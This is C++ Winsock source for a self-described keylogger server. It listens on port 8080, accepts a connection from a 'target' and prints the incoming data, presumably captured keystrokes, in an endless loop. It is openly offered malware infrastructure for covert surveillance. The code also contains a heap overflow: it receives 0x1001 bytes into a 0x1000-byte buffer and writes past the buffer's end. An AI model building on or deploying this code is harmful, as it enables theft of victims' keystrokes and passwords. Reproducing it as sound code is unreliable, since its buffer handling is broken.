#include <winsock2.h>
#include <stdio.h>
using namespace std;

int main()
{
    WSADATA WSA;
    SOCKET Listener, acceptedTarget;
    SOCKADDR_IN server, target;
    int cL;
    char* buffer = (char*)malloc(0x1000);
    printf("Welcome to the keylogger server version 0.1.0, \n momentarily the listener should be established!\n");
    printf("\t[*] Initalizing socket...\n");
    if (WSAStartup(MAKEWORD(2,2), &WSA) !=0)
    {
        printf("\t\t[*] WSAstartup has failed with Error Code: %d",WSAGetLastError());
        return -1;
    }
    printf("\t\t[*] WSA startup complete!\n\t[*] creating socket!");
    if((Listener = socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET)
    {
        printf("Error in creating socket, error code: %d", WSAGetLastError());
        return -1;
    }
    server.sin_family =AF_INET;
    server.sin_addr.S_un.S_addr = INADDR_ANY;
    server.sin_port=htons(8080);
    printf("\n\t\t[*] attempting to bind socket to port 8080: ");
    if(bind(Listener,(struct sockaddr*)&server,sizeof(server))== SOCKET_ERROR)
    {
        printf("failed to bind socket, Error code %d", WSAGetLastError());
        return -1;
    }
    printf("accepted\n\t\t[*]Listening: ");
    listen(Listener,3);
    cL=sizeof(target);
    acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
    if(acceptedTarget==INVALID_SOCKET)
    {
        printf("\n\t\t[*] error connecting");
        return -1;
    }
    printf(" connection accepted\n[*] IP ADDRESS %d",htonl(target.sin_addr.S_un.S_addr));
    while(1)
    {
        recv(acceptedTarget,buffer,0x1001,0);
        *(buffer+0x1000)=0x00;
        printf("%s",buffer);
    }
    return 0;
}
